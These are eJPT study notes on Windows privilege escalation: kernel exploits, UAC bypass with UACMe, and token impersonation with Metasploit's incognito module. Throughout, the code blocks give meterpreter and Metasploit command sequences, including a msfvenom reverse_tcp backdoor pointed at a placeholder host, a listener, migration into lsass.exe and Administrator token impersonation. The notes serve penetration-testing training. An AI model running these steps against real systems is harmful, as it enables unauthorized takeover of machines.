# 17 Windows Privilege Escalation

# Windows Kernel Exploits

- Kernel has complete contro over every resource and hardware on a system. It acts as a translation layer between hardware and software.
- **Windows NT** is the kernel that comes pre-packaged with all versions of Microsoft Windows.
	- User Mode: Program and services running in user mode have limited access to system resources and functionality.
	- Kernel Mode: Unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.

- Kernel exploits on Windows typically target vulnerabilities in the Windows kernel to execute arbitrary code, enabling the execution of privileged system commands or obtaining a system shell.

- Privilege escalation on Windows systems
	- Identifying kernel vulnerabilities
	- Downloading, compiling and transferring kernel exploits onto the target system

**Tools**

- **Windows-Exploit-Suggester:** Compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user is there are public exploits and Metasploit modules available for the missing bulletins. 
	- https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- **Windows-Kernel-Exploits:** Collection of Windows Kernel exploits sorted by CVE.
	- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135

### Demo

```shell
meterpreter: getsystem (evelevate privileges)
msf6: post(multi/recon/local_exploit_suggester) (enumerate exploit)

meterpreter: shell
C:\: systeminfo
nano systeminfo.txt (copy here)
cd Windows-Exploit-Suggester
	./windows-exploit-suggester.py --update
	./windows-exploit-suggester.py --database <last.xls> --systeminfo systeminfo.txt
Download from Github /Windows-Kernel-Exploits the .exe of vuln
meterpreter: cd Temp\\
	upload <PATH>/exploit.exe
	shell
	dir
	.\exploit.exe
	.\exploit.exe <N>
```

# Bypassing UAC with UACMe

- In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group in the Windows target system.
- Has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation
- There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used depend on the version of Windows running on the target system.

**Tool**

- https://github.com/hfiref0x/UACME

Robust privilege escalation tool. It can bypass Windows UAC by leveraging various techniques.
Execute malicious payloads with administrative/elevated privileges by abusing the Windows AutoElevate.
More than 60 exploits depending of Windows version.

**Exploit**

```shell
msf6: exploit(windows/http/rejetto_hfs_exec)
meterpreter: pgrep explorer
meterpreter: migrate to <N> (migrate to 64-bit meterpreter session)
meterpreter: sysinfo
meterpreter: getuid
meterpreter: getprivs
meterpreter: shell
meterpreter: net user
meterpreter: net localgroup administrators
meterpreter: getsystem (elevate privilege)

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > 'backdoor.exe'
msf6: exploit(multi/handler)
msf6: set payload windows/meterpreter/reverse_tcp
msf6: run (listen)
	meterpreter: getuid
	meterpreter: getprivs
	meterpreter: ps
	meterpreter: migrate <N> (lsass.exe)
	meterpreter: getuid

meterpreter: upload backdoor.exe
meterpreter: upload <PATH>/Akagi64.exe
meterpreter: shell 
```

# Access Token Impersonation

- Core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS)
- A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credential each time a process is started or a system resource is accessed.
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and provileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
- Windows access token are categorized based on the varying security levels assigned to them.
  These security levels are used to determine the privileges that are assigned to a specific token.
- An access token will tipically be assigned one of the following security levels:
	- Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
	- Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP.
- Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
- Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.

**Windows Privileges**

- The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation token available.
- The following are the privileges that are required for a successful impersonation attack:
	- SeAssignPrimaryToken: This allows a user to impersonate tokens.
	- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
	- SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.

**The Incognito Module**

- Incognito is a built.in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.
- We can use the incognito module to display a list of available tokens that we can impersonate.

## Exploit

```shell
msf6: exploit(windows/http/rejetto_hfs_exec)
meterpreter: sysinfo
meterpreter: pgrep explorer
meterpreter: migrate <N> (Access denied)
meterpreter: getuid
meterpreter: getprivs
meterpreter: load incognito
meterpreter: list_tokens -u
meterpreter: impersonate_token "ATTACKDEFENSE\Administrator"
meterpreter: pgrep explorer
meterpreter: migrate <N>
meterpreter: getprivs
```

#eJPT #cybersecurity 